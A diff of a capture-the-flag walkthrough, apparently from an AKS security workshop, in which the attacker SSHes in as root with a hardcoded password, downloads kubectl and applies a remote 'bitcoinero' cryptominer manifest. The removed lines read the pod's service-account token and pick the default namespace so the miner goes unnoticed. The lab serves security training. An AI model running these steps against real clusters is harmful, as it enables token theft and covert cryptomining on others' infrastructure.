@@ -28,24 +28,10 @@ echo "SSH password is: Sup3r_S3cr3t_P@ssw0rd"
 ssh root@<service IP from attack 1> -p 8080
 ```
 
-To restart our crypto mining, we will need the token for the pod service account:
+Let's redownload kubectl and create our miner:
 ```console
-export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-```
-
-This time, we will create our miner in the `default` namespace. Since it is common for lots of orphaned deployments to land here, maybe ours will go unnoticed:
-```console
-export NAMESPACE=default
-```
-
-And we will be connecting to the kubernetes API from inside the cluster this time:
-```console
-export API_SERVER="https://kubernetes.default.svc"
-```
-
-Let's redownload kubectl here and create our miner:
-```console
-cd /usr/local/bin; curl -LO https://dl.k8s.io/release/v1.30/bin/linux/amd64/kubectl; chmod 555 kubectl
+apk update; apk add curl
+cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl
 export KUBERNETES_SERVICE_HOST=kubernetes.default.svc
 export KUBERNETES_SERVICE_PORT=443
 kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml
@@ -53,9 +39,7 @@ kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main
 
 Verify that the pod is running:
 ```console
-kubectl get pods -n default
-curl -k -X GET "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods?labelSelector=run%3dbitcoinero" -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" 2>/dev/null | grep phase
-kubectl get pods -A
+kubectl get pods -n dev
 ```
 
 Time for some celebratory pizza!
